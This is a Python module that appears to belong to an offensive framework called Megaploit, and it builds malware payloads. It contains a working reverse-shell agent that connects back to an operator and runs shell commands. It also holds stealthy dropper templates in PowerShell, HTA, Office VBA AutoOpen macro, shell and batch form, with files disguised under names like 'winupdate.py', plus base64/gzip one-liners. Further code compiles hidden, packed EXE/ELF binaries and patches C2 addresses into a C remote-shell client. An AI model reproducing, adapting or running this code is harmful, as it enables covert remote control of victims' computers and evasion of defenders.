"""
megaploit.payload.builder
~~~~~~~~~~~~~~~~~~~~~~~~~
Multi-format payload / dropper builder for Megaploit agents.

Supported output formats
-------------------------
  py      — standalone Python source  (self-contained, no deps beyond stdlib)
  ps1     — PowerShell script dropper
  hta     — HTML Application  (.hta) dropper  (Windows MSHTA)
  vba     — VBA macro dropper  (paste into Office document)
  sh      — Bash/sh dropper  (Linux / macOS)
  bat     — Windows batch file dropper
  raw     — raw Python source identical to py (for piping)
  exe     — compiled EXE via PyInstaller  (requires pyinstaller)
  elf     — compiled ELF via PyInstaller  (requires pyinstaller, Linux)
  oneliner_py  — single compressed+base64 Python one-liner
  oneliner_ps1 — single compressed+base64 PowerShell one-liner

Architecture
------------
  1. BuildConfig  — dataclass describing what to build
  2. PayloadBuilder.build(config)  → BuildResult
     - renders the template for the requested format
     - optionally runs an encoder pipeline  (see encoders.py)
     - optionally calls PyInstaller to produce a binary
  3. BuildResult  — output bytes / path

Templates are embedded as string constants; no external Jinja2 required.
"""

from __future__ import annotations

import base64
import gzip
import hashlib
import io
import os
import shutil
import subprocess
import sys
import tempfile
import textwrap
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

__all__ = [
    "OutputFormat",
    "BuildConfig",
    "BuildResult",
    "PayloadBuilder",
    "builder",
]


# ---------------------------------------------------------------------------
# Output format enum
# ---------------------------------------------------------------------------

class OutputFormat(str, Enum):
    PY          = "py"
    PS1         = "ps1"
    HTA         = "hta"
    VBA         = "vba"
    SH          = "sh"
    BAT         = "bat"
    RAW         = "raw"
    EXE         = "exe"
    ELF         = "elf"
    GO_EXE      = "go_exe"    # Go agent compiled to Windows EXE
    GO_ELF      = "go_elf"    # Go agent compiled to Linux ELF
    C_EXE       = "c_exe"     # C-remote-shell client compiled to Windows EXE
    ONELINER_PY  = "oneliner_py"
    ONELINER_PS1 = "oneliner_ps1"


# ---------------------------------------------------------------------------
# Build configuration
# ---------------------------------------------------------------------------

@dataclass
class BuildConfig:
    """All parameters required to build a payload."""
    lhost:       str
    lport:       int
    format:      OutputFormat        = OutputFormat.PY
    use_tls:     bool                = False
    secret_key:  bytes               = b""
    output_path: str                 = ""           # empty → return bytes
    encoders:    list[str]           = field(default_factory=list)
    # Binary compilation options
    icon_path:   str                 = ""
    upx_pack:    bool                = False
    pyinstaller_args: list[str]      = field(default_factory=list)
    # Optional metadata
    name:        str                 = "megaploit_agent"
    # Obfuscation level  0=none  1=light  2=heavy
    obfuscation: int                 = 0


# ---------------------------------------------------------------------------
# Build result
# ---------------------------------------------------------------------------

@dataclass
class BuildResult:
    """Output from a build operation."""
    ok:           bool
    format:       OutputFormat
    data:         bytes                = b""     # raw payload bytes (if not written to disk)
    output_path:  str                  = ""      # path to file on disk (if output_path was set)
    size:         int                  = 0
    sha256:       str                  = ""
    error:        str                  = ""
    build_time_s: float                = 0.0

    def __str__(self) -> str:
        if not self.ok:
            return f"BuildResult: FAILED — {self.error}"
        loc = self.output_path or f"<{self.size} bytes in memory>"
        return f"BuildResult: OK  {self.format.value}  {loc}  sha256={self.sha256[:16]}…"


# ---------------------------------------------------------------------------
# Embedded agent source (minimal self-contained agent)
# ---------------------------------------------------------------------------

_AGENT_SOURCE_TEMPLATE = '''\
# Megaploit agent -- generated {timestamp}
# DO NOT REDISTRIBUTE
import os, sys, socket, ssl, struct, json, time, threading, base64, hashlib, hmac

LHOST   = {lhost!r}
PORT    = {lport}
USE_TLS = {use_tls}
SECRET  = {secret_b64!r}

_KEY = base64.b64decode(SECRET)

def _hmac_sign(data):
    import hmac as _hm, hashlib as _hl
    return _hm.new(_KEY[:32], data, _hl.sha256).digest()

def _send(s, data):
    frame = struct.pack(">I", len(data)) + data
    s.sendall(frame)

def _recv(s):
    hdr = b""
    while len(hdr) < 4:
        chunk = s.recv(4 - len(hdr))
        if not chunk:
            raise ConnectionError
        hdr += chunk
    length = struct.unpack(">I", hdr)[0]
    buf = b""
    while len(buf) < length:
        chunk = s.recv(min(65536, length - len(buf)))
        if not chunk:
            raise ConnectionError
        buf += chunk
    return buf

def _connect():
    while True:
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if USE_TLS:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                s = ctx.wrap_socket(raw, server_hostname=LHOST)
            else:
                s = raw
            s.connect((LHOST, PORT))
            chal = _recv(s)
            resp = _hmac_sign(chal)
            _send(s, resp)
            ack = _recv(s)
            if ack != b"OK":
                s.close()
                time.sleep(5)
                continue
            return s
        except Exception:
            time.sleep(5)

def _run_cmd(cmd):
    import subprocess
    try:
        out = subprocess.check_output(
            cmd, shell=True, stderr=subprocess.STDOUT, timeout=30
        )
        return out.decode(errors="replace")
    except subprocess.TimeoutExpired:
        return "[-] timed out"
    except Exception as e:
        return "[-] " + str(e)

def main():
    while True:
        s = _connect()
        try:
            while True:
                frame = json.loads(_recv(s).decode())
                cmd = frame.get("cmd", "")
                if cmd == "exit":
                    sys.exit(0)
                out = _run_cmd(cmd)
                _send(s, json.dumps({{"output": out}}).encode())
        except Exception:
            pass
        try:
            s.close()
        except Exception:
            pass
        time.sleep(3)

if __name__ == "__main__":
    main()
'''

# ---------------------------------------------------------------------------
# PowerShell dropper template
# ---------------------------------------------------------------------------

_PS1_TEMPLATE = '''\
# Megaploit PS1 dropper — {timestamp}
$ErrorActionPreference = "SilentlyContinue"
$lhost = "{lhost}"
$lport = {lport}
$b64   = "{payload_b64}"
$bytes = [System.Convert]::FromBase64String($b64)
$dec   = [System.Text.Encoding]::UTF8.GetString($bytes)
$tmp   = [System.IO.Path]::GetTempFileName() -replace "\\.tmp",".py"
[System.IO.File]::WriteAllText($tmp, $dec)
Start-Process python -ArgumentList $tmp -WindowStyle Hidden
Remove-Item $tmp -Force
'''

# ---------------------------------------------------------------------------
# HTA dropper template
# ---------------------------------------------------------------------------

_HTA_TEMPLATE = '''\
<html>
<head>
<hta:application id="app" windowstate="minimize" showintaskbar="no"
  sysmenu="no" caption="no" border="none"/>
<script language="VBScript">
Dim b64, tmp, fso, ts, wsh
b64 = "{payload_b64}"
tmp = Environ("TEMP") & "\\update.py"
Set fso = CreateObject("Scripting.FileSystemObject")
Set ts  = fso.CreateTextFile(tmp, True)
ts.Write DecodeBase64(b64)
ts.Close
Set wsh = CreateObject("WScript.Shell")
wsh.Run "pythonw.exe " & tmp, 0, False
Function DecodeBase64(b64str)
  Dim dom, el
  Set dom = CreateObject("Microsoft.XMLDOM")
  Set el  = dom.createElement("tmp")
  el.dataType = "bin.base64"
  el.text = b64str
  DecodeBase64 = Stream_BinaryToString(el.nodeTypedValue)
End Function
Function Stream_BinaryToString(Bin)
  Dim stream
  Set stream = CreateObject("ADODB.Stream")
  stream.Type     = 1
  stream.Open
  stream.Write Bin
  stream.Position = 0
  stream.Type     = 2
  stream.CharSet  = "UTF-8"
  Stream_BinaryToString = stream.ReadText
  stream.Close
End Function
window.close()
</script>
</head><body></body></html>
'''

# ---------------------------------------------------------------------------
# VBA template
# ---------------------------------------------------------------------------

_VBA_TEMPLATE = '''\
' Megaploit VBA Dropper — {timestamp}
' Paste into a Document_Open or AutoOpen macro
Sub AutoOpen()
    Dim b64 As String
    Dim tmp As String
    Dim fso As Object
    Dim ts  As Object
    Dim wsh As Object
    b64 = "{payload_b64}"
    tmp = Environ("TEMP") & "\\winupdate.py"
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set ts  = fso.CreateTextFile(tmp, True)
    ts.Write DecodeBase64(b64)
    ts.Close
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "pythonw.exe " & tmp, 0, False
End Sub

Private Function DecodeBase64(ByVal b64 As String) As String
    Dim dom As Object, el As Object
    Set dom = CreateObject("Microsoft.XMLDOM")
    Set el  = dom.createElement("tmp")
    el.DataType = "bin.base64"
    el.Text = b64
    Dim ado As Object
    Set ado = CreateObject("ADODB.Stream")
    ado.Type    = 1
    ado.Open
    ado.Write el.NodeTypedValue
    ado.Position = 0
    ado.Type    = 2
    ado.CharSet = "UTF-8"
    DecodeBase64 = ado.ReadText
    ado.Close
End Function
'''

# ---------------------------------------------------------------------------
# Bash/sh dropper template
# ---------------------------------------------------------------------------

_SH_TEMPLATE = '''\
#!/bin/sh
# Megaploit sh dropper — {timestamp}
set -e
B64="{payload_b64}"
TMP="$(mktemp /tmp/.XXXXXX.py)"
echo "$B64" | base64 -d > "$TMP"
chmod +x "$TMP"
nohup python3 "$TMP" >/dev/null 2>&1 &
rm -f "$TMP"
'''

# ---------------------------------------------------------------------------
# Batch file dropper template
# ---------------------------------------------------------------------------

_BAT_TEMPLATE = '''\
@echo off
rem Megaploit batch dropper — {timestamp}
setlocal
set B64={payload_b64}
set TMP=%TEMP%\\winupdater.py
powershell -NoP -W Hidden -C "[System.IO.File]::WriteAllBytes('%TMP%', [System.Convert]::FromBase64String('%B64%'))"
start /B /WAIT pythonw.exe "%TMP%"
del "%TMP%" 2>nul
endlocal
'''

# ---------------------------------------------------------------------------
# One-liner templates
# ---------------------------------------------------------------------------

_ONELINER_PY_TEMPLATE = (
    "python3 -c \""
    "import base64,gzip,exec;"
    "exec(gzip.decompress(base64.b64decode('{gz_b64}')).decode())"
    "\""
)

_ONELINER_PS1_TEMPLATE = (
    "powershell -NoP -W Hidden -C \""
    "$b=[System.Convert]::FromBase64String('{gz_b64}');"
    "$s=New-Object IO.MemoryStream(,$b);"
    "$g=New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress);"
    "$r=New-Object IO.StreamReader($g);"
    "Invoke-Expression $r.ReadToEnd()"
    "\""
)


# ---------------------------------------------------------------------------
# Builder class
# ---------------------------------------------------------------------------

class PayloadBuilder:
    """
    Builds payloads in the requested format.

    Usage::

        cfg = BuildConfig(lhost="10.0.0.1", lport=4444, format=OutputFormat.PS1)
        result = builder.build(cfg)
        print(result)
    """

    # ------------------------------------------------------------------

    def build(self, config: BuildConfig) -> BuildResult:
        """Build the payload described by *config*."""
        t0 = time.time()
        try:
            data = self._render(config)
            data = self._apply_encoders(data, config)
            result = self._write_or_compile(data, config)
            result.build_time_s = time.time() - t0
            return result
        except Exception as exc:
            return BuildResult(
                ok=False,
                format=config.format,
                error=str(exc),
                build_time_s=time.time() - t0,
            )

    # ------------------------------------------------------------------
    # Render
    # ------------------------------------------------------------------

    def _render(self, cfg: BuildConfig) -> bytes:
        fmt = cfg.format
        ts  = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())
        sk  = base64.b64encode(cfg.secret_key or b"\x00" * 32).decode()

        # C-EXE is handled entirely in _write_or_compile; return empty bytes here
        if fmt == OutputFormat.C_EXE:
            return b""

        # Build the Python agent source first
        agent_src = _AGENT_SOURCE_TEMPLATE.format(
            timestamp=ts,
            lhost=cfg.lhost,
            lport=cfg.lport,
            use_tls=cfg.use_tls,
            secret_b64=sk,
        )

        if fmt in (OutputFormat.PY, OutputFormat.RAW,
                   OutputFormat.EXE, OutputFormat.ELF,
                   OutputFormat.GO_EXE, OutputFormat.GO_ELF):
            return agent_src.encode()

        # Base64 encode the agent source for dropper formats
        payload_b64 = base64.b64encode(agent_src.encode()).decode()

        if fmt == OutputFormat.PS1:
            return _PS1_TEMPLATE.format(
                timestamp=ts, lhost=cfg.lhost, lport=cfg.lport, payload_b64=payload_b64
            ).encode()

        if fmt == OutputFormat.HTA:
            return _HTA_TEMPLATE.format(
                timestamp=ts, payload_b64=payload_b64
            ).encode()

        if fmt == OutputFormat.VBA:
            return _VBA_TEMPLATE.format(
                timestamp=ts, payload_b64=payload_b64
            ).encode()

        if fmt == OutputFormat.SH:
            return _SH_TEMPLATE.format(
                timestamp=ts, payload_b64=payload_b64
            ).encode()

        if fmt == OutputFormat.BAT:
            return _BAT_TEMPLATE.format(
                timestamp=ts, payload_b64=payload_b64
            ).encode()

        if fmt == OutputFormat.ONELINER_PY:
            gz   = gzip.compress(agent_src.encode(), compresslevel=9)
            gz64 = base64.b64encode(gz).decode()
            return _ONELINER_PY_TEMPLATE.format(gz_b64=gz64).encode()

        if fmt == OutputFormat.ONELINER_PS1:
            gz   = gzip.compress(agent_src.encode(), compresslevel=9)
            gz64 = base64.b64encode(gz).decode()
            return _ONELINER_PS1_TEMPLATE.format(gz_b64=gz64).encode()

        raise ValueError(f"Unsupported format: {fmt}")

    # ------------------------------------------------------------------
    # Encoder pipeline
    # ------------------------------------------------------------------

    def _apply_encoders(self, data: bytes, cfg: BuildConfig) -> bytes:
        if not cfg.encoders:
            return data
        try:
            from megaploit.payload.encoders import encode_pipeline
            return encode_pipeline(data, cfg.encoders)
        except ImportError:
            return data

    # ------------------------------------------------------------------
    # Write / compile
    # ------------------------------------------------------------------

    def _write_or_compile(self, data: bytes, cfg: BuildConfig) -> BuildResult:
        fmt = cfg.format
        sha = hashlib.sha256(data).hexdigest()

        # Binary compilation — C-remote-shell Windows EXE
        if fmt == OutputFormat.C_EXE:
            return self._compile_c_agent(cfg)

        # Binary compilation — Go agent
        if fmt in (OutputFormat.GO_EXE, OutputFormat.GO_ELF):
            return self._compile_go(cfg)

        # Binary compilation — PyInstaller
        if fmt in (OutputFormat.EXE, OutputFormat.ELF):
            return self._compile_binary(data, cfg, sha)

        # Write to disk or return in-memory
        if cfg.output_path:
            with open(cfg.output_path, "wb") as f:
                f.write(data)
            return BuildResult(
                ok=True, format=fmt,
                output_path=cfg.output_path,
                size=len(data), sha256=sha,
            )
        return BuildResult(
            ok=True, format=fmt, data=data, size=len(data), sha256=sha
        )

    # ------------------------------------------------------------------
    # PyInstaller compilation
    # ------------------------------------------------------------------

    def _compile_binary(self, src: bytes, cfg: BuildConfig, sha: str) -> BuildResult:
        if not shutil.which("pyinstaller"):
            return BuildResult(
                ok=False, format=cfg.format,
                error="pyinstaller not found in PATH — install with: pip install pyinstaller",
            )

        with tempfile.TemporaryDirectory() as tmp_dir:
            src_path  = os.path.join(tmp_dir, f"{cfg.name}.py")
            out_dir   = os.path.join(tmp_dir, "dist")
            spec_dir  = os.path.join(tmp_dir, "spec")
            with open(src_path, "wb") as f:
                f.write(src)

            cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--distpath", out_dir,
                "--specpath", spec_dir,
                "--name", cfg.name,
            ]
            if cfg.icon_path and os.path.isfile(cfg.icon_path):
                cmd += ["--icon", cfg.icon_path]
            if cfg.upx_pack and shutil.which("upx"):
                cmd += ["--upx-dir", os.path.dirname(shutil.which("upx"))]
            cmd += cfg.pyinstaller_args
            cmd.append(src_path)

            try:
                subprocess.check_call(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.STDOUT,
                    timeout=300,
                )
            except subprocess.CalledProcessError as exc:
                return BuildResult(
                    ok=False, format=cfg.format,
                    error=f"PyInstaller exited with code {exc.returncode}",
                )
            except subprocess.TimeoutExpired:
                return BuildResult(
                    ok=False, format=cfg.format,
                    error="PyInstaller compilation timed out (300s)",
                )

            # Find the built binary
            ext  = ".exe" if cfg.format == OutputFormat.EXE else ""
            bins = [
                os.path.join(out_dir, f)
                for f in os.listdir(out_dir)
                if f == cfg.name + ext or f == cfg.name
            ]
            if not bins:
                return BuildResult(
                    ok=False, format=cfg.format,
                    error="PyInstaller succeeded but no binary found in dist/",
                )

            bin_path = bins[0]
            if cfg.output_path:
                shutil.copy2(bin_path, cfg.output_path)
                final_path = cfg.output_path
            else:
                final_path = os.path.abspath(os.path.basename(bin_path))
                shutil.copy2(bin_path, final_path)

            size = os.path.getsize(final_path)
            with open(final_path, "rb") as f:
                final_sha = hashlib.sha256(f.read()).hexdigest()

            return BuildResult(
                ok=True, format=cfg.format,
                output_path=final_path,
                size=size, sha256=final_sha,
            )

    # ------------------------------------------------------------------
    # C agent compilation
    # ------------------------------------------------------------------

    def _compile_c_agent(self, cfg: BuildConfig) -> BuildResult:
        """
        Compile the C-remote-shell client from the C-remote-shell source tree.

        Source layout is auto-discovered via megaploit.core.c_probe so that
        no subdirectory names are hardcoded here — the prober locates:
          - the config.h to patch (file that defines C2_IP / C2_PORT)
          - the main.c entry point
          - all .c files that contain the four C2 security layers

        Requires either:
          cl.exe   (MSVC — available in a Developer Command Prompt)
          x86_64-w64-mingw32-gcc  (MinGW cross-compiler on Linux/macOS)
        """
        import shutil, subprocess, tempfile, os, hashlib, time as _time, textwrap

        # Locate the C-remote-shell source tree relative to this file
        here   = os.path.dirname(os.path.abspath(__file__))
        c_root = os.path.normpath(os.path.join(here, "..", "C-remote-shell"))
        if not os.path.isdir(c_root):
            return BuildResult(
                ok=False, format=cfg.format,
                error=f"C-remote-shell source not found at: {c_root}",
            )

        # ── Use c_probe to auto-discover the source structure ──────────────
        from megaploit.core.c_probe import probe as _probe
        pr = _probe(c_root)
        if not pr.compliant:
            missing = ", ".join(s.signal.name for s in pr.required_missing)
            return BuildResult(
                ok=False, format=cfg.format,
                error=f"C source tree is not C2-compliant. Missing: {missing}",
            )

        # Walk the tree to find all .c source files that belong to the client.
        # We include every .c file that is NOT under server/ and NOT the
        # standalone serverShell.c (which has its own main()).
        client_sources: list[str] = []
        for dirpath, _dirs, filenames in os.walk(c_root):
            _dirs[:] = [d for d in _dirs if d not in (".git", "build",
                                                       "Release", "Debug",
                                                       "server")]
            reldir = os.path.relpath(dirpath, c_root)
            for fname in sorted(filenames):
                if not fname.lower().endswith(".c"):
                    continue
                if fname.lower() == "servershell.c":
                    continue
                client_sources.append(os.path.join(dirpath, fname))

        if not client_sources:
            return BuildResult(
                ok=False, format=cfg.format,
                error="No client .c files found in C-remote-shell tree",
            )

        # Find config.h — first .h file that contains C2_IP definition
        config_path: str | None = None
        for dirpath, _dirs, filenames in os.walk(c_root):
            _dirs[:] = [d for d in _dirs if d not in (".git", "build", "server")]
            for fname in filenames:
                if fname.lower() == "config.h":
                    candidate = os.path.join(dirpath, fname)
                    try:
                        with open(candidate, encoding="utf-8", errors="replace") as f:
                            txt = f.read()
                        if "C2_IP" in txt and "C2_PORT" in txt:
                            config_path = candidate
                            break
                    except OSError:
                        pass
            if config_path:
                break

        if not config_path:
            return BuildResult(
                ok=False, format=cfg.format,
                error="config.h with C2_IP/C2_PORT not found in C-remote-shell tree",
            )

        # Embed the key as a static hex array — no secret.key file needed
        key_bytes = cfg.secret_key or b"\x00" * 32
        key_hex_array = ", ".join(f"0x{b:02x}" for b in key_bytes[:32])

        patched_config = textwrap.dedent(f"""\
            /* config.h — generated by Megaploit payload builder */
            #pragma once
            #ifndef CLIENT_CONFIG_H
            #define CLIENT_CONFIG_H

            #define C2_IP               "{cfg.lhost}"
            #define C2_PORT             {cfg.lport}
            #define RECONNECT_DELAY_SEC 10
            #define SECRET_KEY_PATH     "secret.key"  /* unused — key embedded */
            #define SECRET_KEY_LEN      32
            #define SHELL_LINE_BUF      1024
            #define SHELL_RESP_BUF      18384

            /* 32-byte key embedded at build time — no file needed on target */
            static const unsigned char _EMBEDDED_KEY[32] = {{ {key_hex_array} }};

            #endif /* CLIENT_CONFIG_H */
        """)

        # Back up the original config.h; we restore it in the finally block
        with open(config_path, "r", encoding="utf-8") as f:
            original_config = f.read()

        t0 = _time.time()
        try:
            with open(config_path, "w", encoding="utf-8") as f:
                f.write(patched_config)

            # Work in a temp directory; copy all discovered sources so we
            # can patch main.c without modifying the original source tree.
            with tempfile.TemporaryDirectory() as tmp:
                # Replicate only the directories that contain client sources
                copied: dict[str, str] = {}   # original → tmp path
                seen_dirs: set[str] = set()
                for src in client_sources:
                    rel  = os.path.relpath(src, c_root)
                    dst  = os.path.join(tmp, rel)
                    dst_dir = os.path.dirname(dst)
                    if dst_dir not in seen_dirs:
                        os.makedirs(dst_dir, exist_ok=True)
                        seen_dirs.add(dst_dir)
                    shutil.copy2(src, dst)
                    copied[src] = dst

                # Copy all .h files from any directory that already has .c files
                src_dirs = {os.path.dirname(s) for s in client_sources}
                src_dirs.add(c_root)   # root-level headers
                for src_dir in src_dirs:
                    for fname in os.listdir(src_dir):
                        if fname.lower().endswith(".h"):
                            src_h = os.path.join(src_dir, fname)
                            rel_h = os.path.relpath(src_h, c_root)
                            dst_h = os.path.join(tmp, rel_h)
                            os.makedirs(os.path.dirname(dst_h), exist_ok=True)
                            shutil.copy2(src_h, dst_h)

                # Patch main.c in tmp: use _EMBEDDED_KEY instead of file load
                for orig, tmpc in copied.items():
                    if os.path.basename(orig).lower() == "main.c":
                        with open(tmpc, "r", encoding="utf-8") as f:
                            main_src = f.read()
                        main_src = main_src.replace(
                            "if (!load_secret_key(SECRET_KEY_PATH, secretKey))",
                            "memcpy(secretKey, _EMBEDDED_KEY, 32); if (0)"
                        )
                        with open(tmpc, "w", encoding="utf-8") as f:
                            f.write(main_src)

                # Build source list (tmp copies)
                tmp_sources = [copied[s] for s in client_sources]

                out_name = (cfg.name or "megaploit_c_agent") + ".exe"
                out_path = os.path.join(tmp, out_name)

                # Try MSVC first, then MinGW
                cl    = shutil.which("cl")
                mingw = shutil.which("x86_64-w64-mingw32-gcc")

                if cl:
                    cmd = (
                        ["cl", "/nologo", "/W3", "/O2", "/DNDEBUG"]
                        + tmp_sources
                        + ["/link", "Secur32.lib", "Crypt32.lib",
                           "ws2_32.lib", "bcrypt.lib", "Advapi32.lib",
                           "User32.lib", f"/out:{out_path}"]
                    )
                    compiler_label = "MSVC cl.exe"
                elif mingw:
                    cmd = (
                        [mingw, "-O2", "-DNDEBUG", "-DUNICODE", "-D_UNICODE",
                         "-DSECURITY_WIN32"]
                        + tmp_sources
                        + ["-o", out_path,
                           "-lsecur32", "-lcrypt32", "-lws2_32",
                           "-lbcrypt", "-ladvapi32", "-luser32",
                           "-mwindows"]
                    )
                    compiler_label = "MinGW x86_64-w64-mingw32-gcc"
                else:
                    return BuildResult(
                        ok=False, format=cfg.format,
                        error=(
                            "No C compiler found. Install one of:\n"
                            "  MSVC: open a 'Developer Command Prompt for VS'\n"
                            "  MinGW: apt install mingw-w64  (Linux/macOS)"
                        ),
                    )

                try:
                    subprocess.check_call(
                        cmd,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT,
                        timeout=120,
                    )
                except subprocess.CalledProcessError as exc:
                    return BuildResult(
                        ok=False, format=cfg.format,
                        error=f"{compiler_label} exited with code {exc.returncode}",
                        build_time_s=_time.time() - t0,
                    )
                except subprocess.TimeoutExpired:
                    return BuildResult(
                        ok=False, format=cfg.format,
                        error=f"{compiler_label} timed out (120s)",
                        build_time_s=_time.time() - t0,
                    )

                if not os.path.isfile(out_path):
                    return BuildResult(
                        ok=False, format=cfg.format,
                        error=f"{compiler_label} succeeded but binary not found",
                        build_time_s=_time.time() - t0,
                    )

                # Move to final destination
                if cfg.output_path:
                    shutil.copy2(out_path, cfg.output_path)
                    final = cfg.output_path
                else:
                    final = os.path.abspath(out_name)
                    shutil.copy2(out_path, final)

                size = os.path.getsize(final)
                with open(final, "rb") as fh:
                    sha = hashlib.sha256(fh.read()).hexdigest()

                return BuildResult(
                    ok=True, format=cfg.format,
                    output_path=final,
                    size=size, sha256=sha,
                    build_time_s=_time.time() - t0,
                )

        finally:
            # Always restore the original config.h
            with open(config_path, "w", encoding="utf-8") as f:
                f.write(original_config)

    # ------------------------------------------------------------------
    # Go agent compilation
    # ------------------------------------------------------------------


    def _compile_go(self, cfg: BuildConfig) -> BuildResult:
        """
        Build the Go agent from ``megaploit/agent/go_agent/`` using ``go build``.

        Patches LHOST / PORT / SECRET into the source via ``-ldflags`` overrides
        (the Go source exposes ``var LHOST``, ``var PORT``, ``var SECRET`` package
        variables that accept linker ``-X`` injection).
        """
        import shutil, subprocess, tempfile, os, hashlib, time as _time

        if not shutil.which("go"):
            return BuildResult(
                ok=False, format=cfg.format,
                error="'go' not found in PATH — install Go from https://go.dev/dl/",
            )

        # Locate the go_agent source directory
        here     = os.path.dirname(os.path.abspath(__file__))
        go_src   = os.path.normpath(os.path.join(here, "..", "agent", "go_agent"))
        if not os.path.isdir(go_src):
            return BuildResult(
                ok=False, format=cfg.format,
                error=f"Go agent source not found: {go_src}",
            )

        import base64 as _b64
        secret_b64 = _b64.b64encode(cfg.secret_key or b"\x00" * 32).decode()

        is_windows = cfg.format == OutputFormat.GO_EXE
        ext        = ".exe" if is_windows else ""
        out_name   = (cfg.name or "megaploit_agent") + ext

        with tempfile.TemporaryDirectory() as tmp:
            out_path = os.path.join(tmp, out_name)
            # Inject config via -ldflags -X main.LHOST=… etc.
            pkg     = "main"
            ldflags = (
                f"-s -w "
                f"-X {pkg}.LHOST={cfg.lhost} "
                f"-X {pkg}.PORT={cfg.lport} "
                f"-X {pkg}.SECRET={secret_b64}"
            )
            env = dict(os.environ)
            if is_windows:
                env["GOOS"]   = "windows"
                env["GOARCH"] = "amd64"
            else:
                env.setdefault("GOOS", "linux")
                env.setdefault("GOARCH", "amd64")

            cmd = ["go", "build", f"-ldflags={ldflags}", "-o", out_path, "."]
            t0  = _time.time()
            try:
                subprocess.check_call(
                    cmd,
                    cwd=go_src,
                    env=env,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.STDOUT,
                    timeout=120,
                )
            except subprocess.CalledProcessError as exc:
                return BuildResult(
                    ok=False, format=cfg.format,
                    error=f"go build exited with code {exc.returncode}",
                    build_time_s=_time.time() - t0,
                )
            except subprocess.TimeoutExpired:
                return BuildResult(
                    ok=False, format=cfg.format,
                    error="go build timed out (120s)",
                    build_time_s=_time.time() - t0,
                )

            if not os.path.isfile(out_path):
                return BuildResult(
                    ok=False, format=cfg.format,
                    error="go build succeeded but binary not found",
                )

            # Move binary to final destination
            if cfg.output_path:
                shutil.copy2(out_path, cfg.output_path)
                final = cfg.output_path
            else:
                final = os.path.abspath(out_name)
                shutil.copy2(out_path, final)

            size = os.path.getsize(final)
            with open(final, "rb") as fh:
                sha = hashlib.sha256(fh.read()).hexdigest()

            return BuildResult(
                ok=True, format=cfg.format,
                output_path=final,
                size=size, sha256=sha,
                build_time_s=_time.time() - t0,
            )

    # ------------------------------------------------------------------
    # Quick helpers
    # ------------------------------------------------------------------

    def build_py(self, lhost: str, lport: int, **kwargs) -> BuildResult:
        return self.build(BuildConfig(lhost=lhost, lport=lport,
                                      format=OutputFormat.PY, **kwargs))

    def build_ps1(self, lhost: str, lport: int, **kwargs) -> BuildResult:
        return self.build(BuildConfig(lhost=lhost, lport=lport,
                                      format=OutputFormat.PS1, **kwargs))

    def build_sh(self, lhost: str, lport: int, **kwargs) -> BuildResult:
        return self.build(BuildConfig(lhost=lhost, lport=lport,
                                      format=OutputFormat.SH, **kwargs))

    def build_exe(self, lhost: str, lport: int, **kwargs) -> BuildResult:
        return self.build(BuildConfig(lhost=lhost, lport=lport,
                                      format=OutputFormat.EXE, **kwargs))

    def build_oneliner(self, lhost: str, lport: int,
                        ps1: bool = False, **kwargs) -> BuildResult:
        fmt = OutputFormat.ONELINER_PS1 if ps1 else OutputFormat.ONELINER_PY
        return self.build(BuildConfig(lhost=lhost, lport=lport, format=fmt, **kwargs))

    # ------------------------------------------------------------------
    # Introspection
    # ------------------------------------------------------------------

    @staticmethod
    def supported_formats() -> list[str]:
        return [f.value for f in OutputFormat]

    def __repr__(self) -> str:
        return f"<PayloadBuilder  formats={self.supported_formats()}>"


# ---------------------------------------------------------------------------
# Singleton
# ---------------------------------------------------------------------------

builder = PayloadBuilder()
